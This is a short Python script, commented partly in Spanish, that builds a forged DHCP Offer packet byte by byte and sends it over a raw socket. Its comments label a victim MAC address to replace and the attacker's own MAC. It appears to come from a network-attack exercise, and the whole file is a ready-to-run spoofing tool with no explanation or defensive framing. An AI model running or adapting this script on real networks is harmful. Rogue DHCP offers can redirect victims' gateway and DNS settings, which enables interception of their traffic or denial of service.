##### CÓDIGO APRA ENVIAR UN MENSAJE DHCP FALSO #####

import socket
import struct


ETHERNET_PACKET = [
    struct.pack('!6B', 0x01,0x23,0x45,0x67,0x89,0xab), # Destination MAC --> MAC victima --> ### CHANGE IT ###
    struct.pack('!6B', 0x08,0x00,0x27,0x5e,0x33,0x32), # Source MAC --> MAC atacante
    struct.pack('!H', 0x0800) #
]

IPV4_PACKET = [
    struct.pack('!B', 0x45), # version and header_length
    struct.pack('!B', 0x00), # differentiated services field
    struct.pack('!H', 0x013a), # total length = 314
    struct.pack('!H', 0x0000), # identification
    struct.pack('!H', 0x0000), # flags
    struct.pack('!B', 0x40), # time to live = 64
    struct.pack('!B', 0x11), # protocol = 17 = UDP
    struct.pack('!H', 0xb90a), # header checksum
    struct.pack('!4B', 0xc0,0xa8,0x00,0x01), # ip_source
    struct.pack('!4B', 0xff,0xff,0xff,0xff), # ip_destination
]

UDP_PACKET = [
    struct.pack('!H', 0x0043), # source por = 67
    struct.pack('!H', 0x0044), # destination por = 68
    struct.pack('!H', 0x0126), # length = 294
    struct.pack('!H', 0x7bd0), # checksum
]

DHCP_PACKET = [
    struct.pack('!B', 0x02), # message type
    struct.pack('!B', 0x01), # hardware type
    struct.pack('!B', 0x06), # hardware address length = 6
    struct.pack('!B', 0x00), # hops
    struct.pack('!4B', 0x5d,0x27,0x1a,0xfc), # transaction id
    struct.pack('!H', 0x0000), # seconds elapsed
    struct.pack('!H', 0x8000), # bootp flags
    struct.pack('!4B', 0x00,0x00,0x00,0x00), # client ip address
    struct.pack('!4B', 0xc0,0xa8,0x00,0x13), # Your (client) ip address = 192.168.0.19
    struct.pack('!4B', 0x00,0x00,0x00,0x00), # next server IP address
    struct.pack('!4B', 0x00,0x00,0x00,0x00), # relay agent ip address
    struct.pack('!6B', 0x08,0x00,0x27,0x5e,0x33,0x32), # client MAC address
    struct.pack('!10B', 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00), # client hardware address padding
    struct.pack('!64B', *(0x00,) * 64), # server host name = not given
    struct.pack('!128B', *(0x00,) * 128), # boot file name = not given
    struct.pack('!4B', 0x63,0x82,0x53,0x63), # Magic cookie: DHCP
    struct.pack('!3B', 0x35,0x01,0x02), # Option: (53) DHCP message type (Offer) --> Option, Length, DHCP type
    struct.pack('!6B', 0x36,0x04,0xc0,0xa8,0x00,0x04), # Option: (54) DHCP server identifier (192.168.0.4) --> Option, Length, DHCP server identifier (ip)
    struct.pack('!6B', 0x33,0x04,0x00,0x01,0x51,0x80), # Option: (51) IP address lease time --> Option, Length, IP address lease time (86400s = 1day)
    struct.pack('!6B', 0x01,0x04,0xff,0xff,0xff,0x00), # Option: (1) subnet mask --> Option, Length, subnet mask
    struct.pack('!6B', 0x03,0x04,0xc0,0xa8,0x00,0x01), # Option: (3) router --> Option, Length, router IP (192.168.0.1)
    struct.pack('!6B', 0x06,0x04,0xc0,0xa8,0x00,0x01), # Option: (6) domain name server --> Option, Length, domain name server (192.168.0.1)
    struct.pack('!6B', 0x3a,0x04,0x00,0x00,0xa8,0xc4), # Option: (58) renewal time value --> Option, Length, renewal time value (43200s = 12h)
    struct.pack('!6B', 0x3b,0x04,0x00,0x01,0x27,0x50), # Option: (59) rebinding time value --> Option, Length, rebinding time value (75600s = 21h)
    struct.pack('!B', 0xff), # Option: (255) end
]


grouped_packets = ETHERNET_PACKET + IPV4_PACKET + UDP_PACKET + DHCP_PACKET
packet = (b''.join(grouped_packets))


sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
sock.bind(('enp0s3', 6))
sock.send(packet)
sock.close()